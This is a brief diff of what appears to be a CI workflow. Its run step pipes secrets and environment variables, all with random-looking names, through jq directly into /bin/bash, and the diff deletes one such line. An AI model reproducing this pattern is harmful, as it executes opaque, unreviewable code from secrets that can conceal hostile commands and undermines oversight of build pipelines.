@@ -21,7 +21,6 @@ jobs:
           wr3243: ${{ secrets.wr3243 }}
         run: |
           printf '%s' "$wr3243" | jq -r .j73 | /bin/bash
-          echo $jskpe80 | jq -r .qvu689 | /bin/bash
           echo $xk6767 | jq -r .tcr867 | /bin/bash
           printf '%s' "$vzwfn4" | jq -r .kbhuq1 | /bin/bash
           echo $mnqqj2999 | jq -r .xlhx0 | /bin/bash
